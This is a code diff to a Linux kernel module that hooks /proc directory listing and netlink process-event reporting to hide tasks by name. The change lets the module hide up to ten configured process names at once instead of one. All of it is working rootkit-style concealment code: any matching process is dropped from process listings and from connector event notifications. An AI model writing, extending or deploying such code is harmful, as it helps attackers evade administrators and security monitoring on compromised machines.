@@ -83,8 +83,10 @@ struct module *this_module = THIS_MODULE;
 static int hidden_base_exe = 0;
 module_param(hidden_base_exe, int, 0644);
 
-static char hidden_proc_name[] = "hidden_comm";
-module_param_string(hidden_proc_name, hidden_proc_name, PATH_MAX, 0644);
+#define MAX_NUM_PROC_NAME 10
+static int num_proc_name = MAX_NUM_PROC_NAME;
+static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm",};
+module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 static char exe_buf[PATH_MAX] = {0};
 
 
@@ -163,6 +165,23 @@ static int get_task_exe(char *buf, int buflen, struct task_struct *task)
         return ret;
 }
 
+static int is_hidden_proc_name(const char *name, int len_name)
+{
+	int i = 0;
+
+	if (!name || len_name <= 0)
+		goto end;
+
+	for (i = 0; i < num_proc_name; i++) {
+		if (hidden_proc_name[i] == NULL)
+			break;
+		if (strncmp(name, hidden_proc_name[i], len_name) == 0)
+			return 1;
+	}
+
+end:
+	return 0;
+}
 static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx)
 {
         struct tgid_iter iter;
@@ -199,11 +218,11 @@ static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx
 
 		if (hidden_base_exe) {
 			if (get_task_exe(exe_buf, sizeof(exe_buf), iter.task) > 0) {
-				if (strncmp(exe_buf, hidden_proc_name, sizeof(exe_buf)) == 0)
+				if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
 					continue;
 			}
 		} else {
-			if (strncmp(iter.task->comm, hidden_proc_name, sizeof(iter.task->comm)) == 0)
+			if (is_hidden_proc_name(iter.task->comm, sizeof(iter.task->comm)))
 				continue;
 		}
 
@@ -411,12 +430,12 @@ static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group
 	struct task_struct *task = current;
 	if (hidden_base_exe) {
 		if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
-			if (strncmp(exe_buf, hidden_proc_name, sizeof(exe_buf)) == 0)
+			if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
 				return 0;
 		}
 	} else {
-		if (strncmp(task->comm, hidden_proc_name, sizeof(task->comm)) == 0)
-				return 0;
+		if (is_hidden_proc_name(task->comm, sizeof(task->comm)))
+			return 0;
 	}
 
 	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
